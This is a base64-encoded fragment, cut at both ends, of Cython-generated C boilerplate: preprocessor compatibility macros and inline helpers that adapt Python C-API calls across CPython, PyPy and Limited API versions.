YgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzTm9uZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIFB5X0lzTm9uZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNOb25lKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9Ob25lKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzVHJ1ZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc1RydWUob2IpIFB5X0lzVHJ1ZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNUcnVlKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9UcnVlKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzRmFsc2UpXG4gICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgUHlfSXNGYWxzZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgX19QeXhfUHlfSXMoKG9iKSwgUHlfRmFsc2UpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTm9uZUFzTnVsbChvYmopICAoX19QeXhfUHlfSXNOb25lKG9iaikgPyBOVUxMIDogKG9iaikpXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBGMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobylcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgX1B5R0NfRklOQUxJWkVEKG8pXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19DSEVDS1RZUEVTXG4gICNkZWZpbmUgUHlfVFBGTEFHU19DSEVDS1RZUEVTIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0hBVkVfSU5ERVhcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfSU5ERVggMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkVcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfU0VRVUVOQ0VcbiAgI2RlZmluZSBQeV9UUEZMQUdTX1NFUVVFTkNFIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX01BUFBJTkdcbiAgI2RlZmluZSBQeV9UUEZMQUdTX01BUFBJTkcgMFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfU1RBQ0tMRVNTXG4gICNkZWZpbmUgTUVUSF9TVEFDS0xFU1MgMFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfRkFTVENBTExcbiAgI2lmbmRlZiBNRVRIX0ZBU1RDQUxMXG4gICAgICNkZWZpbmUgTUVUSF9GQVNUQ0FMTCAweDgwXG4gICNlbmRpZlxuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MpO1xuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcykgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2Vsc2VcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBQeUNGdW5jdGlvbkZhc3RcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHNcbiAgI2Vsc2VcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBfUHlDRnVuY3Rpb25GYXN0XG4gICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMgX1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkc1xuICAjZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgX19QeXhfUHlDRnVuY3Rpb25GYXN0XG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X01FVEhfRkFTVENBTEwgTUVUSF9WQVJBUkdTXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgUHlDRnVuY3Rpb25cbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbldpdGhLZXl3b3Jkc1xuI2VuZGlmXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiAgI2RlZmluZSBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2ZWN0b3JjYWxsZnVuY1xuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICBQeVZlY3RvcmNhbGxfTkFSR1MoKHNpemVfdCkobikpXG4jZWxpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fcHl4X3ZlY3RvcmNhbGxmdW5jKShQeU9iamVjdCAqY2FsbGFibGUsIFB5T2JqZWN0ICpjb25zdCAqYXJncyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgKChzaXplX3QpMSA8PCAoOCAqIHNpemVvZihzaXplX3QpIC0gMSkpXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICAoKFB5X3NzaXplX3QpKCgoc2l6ZV90KShuKSkgJiB+X19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICAwXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICAoKFB5X3NzaXplX3QpKG4pKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBCMVxuI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2soZnVuYylcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSAgKCgoUHlDRnVuY3Rpb25PYmplY3QqKShmdW5jKSktPm1fbWwtPm1sX21ldGgpXG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpICBQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYylcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICAoKChQeUNGdW5jdGlvbk9iamVjdCopKGZ1bmMpKS0+bV9tbC0+bWxfZmxhZ3MpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9TRUxGKFB5T2JqZWN0ICpmdW5jKSB7XG4gICAgcmV0dXJuIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9TVEFUSUMpID8gTlVMTCA6ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX3NlbGY7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHJldHVybiBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKSAgIF9fUHl4X19Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYikgICgodm9pZCltLCBQeVR5cGVfRnJvbVNwZWNXaXRoQmFzZXMocywgYikpXG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDTWV0aG9kKShQeU9iamVjdCAqLCBQeVR5cGVPYmplY3QgKiwgUHlPYmplY3QgKmNvbnN0ICosIHNpemVfdCwgUHlPYmplY3QgKik7XG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKSAgUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpXG4gICNkZWZpbmUgX19QeXhfUHlDTWV0aG9kICBQeUNNZXRob2RcbiNlbmRpZlxuI2lmbmRlZiBNRVRIX01FVEhPRFxuICAjZGVmaW5lIE1FVEhfTUVUSE9EIDB4MjAwXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlPYmplY3RfTWFsbG9jKVxuICAjZGVmaW5lIFB5T2JqZWN0X01hbGxvYyhzKSAgIFB5TWVtX01hbGxvYyhzKVxuICAjZGVmaW5lIFB5T2JqZWN0X0ZyZWUocCkgICAgIFB5TWVtX0ZyZWUocClcbiAgI2RlZmluZSBQeU9iamVjdF9SZWFsbG9jKHApICBQeU1lbV9SZWFsbG9jKHApXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pXG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICNkZWZpbmUgX19QeXhfUHlDb2RlX0hhc0ZyZWVWYXJzKGNvKSAgKFB5Q29kZV9HZXROdW1GcmVlKGNvKSA+IDApXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pIF9QeUZyYW1lX1NldExpbmVOdW1iZXIoKGZyYW1lKSwgKGxpbmVubykpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5Q29kZV9IYXNGcmVlVmFycyhjbykgIChQeUNvZGVfR2V0TnVtRnJlZShjbykgPiAwKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKSAgKGZyYW1lKS0+Zl9saW5lbm8gPSAobGluZW5vKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldCgpXG4jZWxpZiAhQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50IFB5VGhyZWFkU3RhdGVfR0VUKClcbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTFcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HZXRVbmNoZWNrZWQoKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgX1B5VGhyZWFkU3RhdGVfVW5jaGVja2VkR2V0KClcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkICpfX1B5eF9fUHlNb2R1bGVfR2V0U3RhdGUoUHlPYmplY3QgKm9wKVxue1xuICAgIHZvaWQgKnJlc3VsdDtcbiAgICByZXN1bHQgPSBQeU1vZHVsZV9HZXRTdGF0ZShvcCk7XG4gICAgaWYgKCFyZXN1bHQpXG4gICAgICAgIFB5X0ZhdGFsRXJyb3IoIkNvdWxkblwndCBmaW5kIHRoZSBtb2R1bGUgc3RhdGUiKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvKSAoX19weXhfbXN0YXRldHlwZSAqKV9fUHl4X19QeU1vZHVsZV9HZXRTdGF0ZShvKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUob3ApICgodm9pZClvcCxfX3B5eF9tc3RhdGVfZ2xvYmFsKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKSAgX19QeXhfUHlUeXBlX0dldFNsb3QoUHlfVFlQRSgoUHlPYmplY3QgKikgb2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVHJ5R2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KFB5X1RZUEUob2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KFB5X1RZUEUob2JqKSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKHR5cGUpLT5uYW1lKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSAoKCh0eXBlKS0+c3ViKSA/ICgodHlwZSktPnN1Yi0+bmFtZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKSAgKChmdW5jX2N0eXBlKSBQeVR5cGVfR2V0U2xvdCgodHlwZSksIFB5XyMjbmFtZSkpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSlcXFxuICAgICgoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwIHx8XFxcbiAgICAgKFB5VHlwZV9HZXRGbGFncyh0eXBlKSAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHx8IF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA+PSAweDAzMEEwMDAwKSA/XFxcbiAgICAgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSlcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeURpY3RfTmV3UHJlc2l6ZWQpXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgKChuIDw9IDgpID8gUHlEaWN0X05ldygpIDogX1B5RGljdF9OZXdQcmVzaXplZChuKSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgUHlEaWN0X05ldygpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfRGl2aWRlKHgseSkgICAgICAgICBQeU51bWJlcl9UcnVlRGl2aWRlKHgseSlcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW5QbGFjZURpdmlkZSh4LHkpICBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZSh4LHkpXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSkgIF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goZGljdCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVzID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSk7XG4gICAgaWYgKHJlcyA9PSBOVUxMKSBQeUVycl9DbGVhcigpO1xuICAgIHJldHVybiByZXM7XG59XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAyMDAwMFxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvciAgUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3JcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIgICAgICAgICAgIFB5RGljdF9HZXRJdGVtXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICByZXR1cm4gUHlEaWN0X0dldEl0ZW0oZGljdCwgbmFtZSk7XG4jZWxzZVxuICAgIFB5RGljdEVudHJ5ICplcDtcbiAgICBQeURpY3RPYmplY3QgKm1wID0gKFB5RGljdE9iamVjdCopIGRpY3Q7XG4gICAgbG9uZyBoYXNoID0gKChQeVN0cmluZ09iamVjdCAqKSBuYW1lKS0+b2Jfc2hhc2g7XG4gICAgYXNzZXJ0KGhhc2ggIT0gLTEpO1xuICAgIGVwID0gKG1wLT5tYV9sb29rdXApKG1wLCBuYW1lLCBoYXNoKTtcbiAgICBpZiAoZXAgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIGVwLT5tZV92YWx1ZTtcbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW1cbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0cCkgICAoKChQeVR5cGVPYmplY3QgKil0cCktPnRwX2ZsYWdzKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpICAoKF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0eXBlKSAmIChmZWF0dXJlKSkgIT0gMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgIChQeVR5cGVfR2V0RmxhZ3MoKFB5VHlwZU9iamVjdCAqKXRwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKSAgUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpICBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGl0ZXJhdG9yLCB0cF9pdGVybmV4dCwgaXRlcm5leHRmdW5jKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwXG4jZGVmaW5lIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG9iaikgIHtcXFxuICAgIFB5VHlwZU9iamVjdCAqdHlwZSA9IFB5X1RZUEUoKFB5T2JqZWN0KilvYmopO1xcXG4gICAgYXNzZXJ0KF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIFB5X1RQRkxBR1NfSEVBUFRZUEUpKTtcXFxuICAgIFB5T2JqZWN0X0dDX0RlbChvYmopO1xcXG4gICAgUHlfREVDUkVGKHR5cGUpO1xcXG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChvYmopICBQeU9iamVjdF9HQ19EZWwob2JqKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUmVhZENoYXIodSwgaSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSkgICAoKHZvaWQpdSwgMTExNDExMVUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0tJTkQodSkgICAgICAgICAoKHZvaWQpdSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9EQVRBKHUpICAgICAgICAgKCh2b2lkKil1KVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEKGssIGQsIGkpICAgKCh2b2lkKWssIFB5VW5pY29kZV9SZWFkQ2hhcigoUHlPYmplY3QqKShkKSwgaSkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKHUpKVxuI2Vsc2VcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApXG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgIChsaWtlbHkoUHlVbmljb2RlX0lTX1JFQURZKG9wKSkgP1xcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwIDogX1B5VW5pY29kZV9SZWFkeSgoUHlPYmplY3QgKikob3ApKSlcbiAgI2VuZGlmXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpICAgUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0tJTkQodSkgICAgICAgICAoKGludClQeVVuaWNvZGVfS0lORCh1KSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1KSAgICAgICAgIFB5VW5pY29kZV9EQVRBKHUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQUQoaywgZCwgaSkgICBQeVVuaWNvZGVfUkVBRChrLCBkLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9XUklURShrLCBkLCBpLCBjaCkgIFB5VW5pY29kZV9XUklURShrLCBkLCBpLCAoUHlfVUNTNCkgY2gpXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUpKVxuICAjZWxzZVxuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6ICgoUHlDb21wYWN0VW5